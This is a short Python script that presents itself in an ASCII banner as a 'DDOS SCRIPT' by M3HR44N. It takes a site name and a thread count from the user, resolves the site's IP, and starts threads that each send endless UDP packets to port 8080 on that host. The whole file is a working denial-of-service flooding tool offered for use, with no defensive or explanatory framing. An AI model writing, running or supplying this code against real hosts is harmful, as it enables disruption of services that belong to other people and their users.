#Mehraan kiya
#ROSHANAMOOZ.IR

import time
import socket
import sys
import _thread



print("""
                                         DDOS SCRIPT
                                    
                                        AUTHER:M3HR44N

                                    https:github.com/m3hr44n

                                          VERSION 1.1




                                                                                    
               /      \ |  \                |  \  |  \|  \  |  \          
 ______ ____  |  $$$$$$\| $$____    ______  | $$  | $$| $$  | $$ _______  
|      \    \  \$$__| $$| $$    \  /      \ | $$__| $$| $$__| $$|       \ 
| $$$$$$\$$$$\  |     $$| $$$$$$$\|  $$$$$$\| $$    $$| $$    $$| $$$$$$$\
| $$ | $$ | $$ __\$$$$$\| $$  | $$| $$   \$$ \$$$$$$$$ \$$$$$$$$| $$  | $$
| $$ | $$ | $$|  \__| $$| $$  | $$| $$            | $$      | $$| $$  | $$
| $$ | $$ | $$ \$$    $$| $$  | $$| $$            | $$      | $$| $$  | $$
 \$$  \$$  \$$  \$$$$$$  \$$   \$$ \$$             \$$       \$$ \$$   \$$
                                                                          
                                                                                                        


""")


site = input("Enter your site url => :  ")

thread_count = input("Enter Your thread => :  ")

ip = socket.gethostbyname(site)

UDP_PORT = 8080

MESSAGE = "Roshanamooz.ir"


print("UDP target IP:", ip)


print("UDP target port:", UDP_PORT)


time.sleep(3)



def ddos(i):
    while 1:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

        sock.sendto(bytes(MESSAGE,"UTF-8"), (ip, UDP_PORT))

        print("Packet Sent")

for i in range(int(thread_count)):
    try:
        _thread.start_new_thread(ddos, ("Thread-" + str(i),))
    except KeyboardInterrupt:
        sys.exit(0)

while 1:
  pass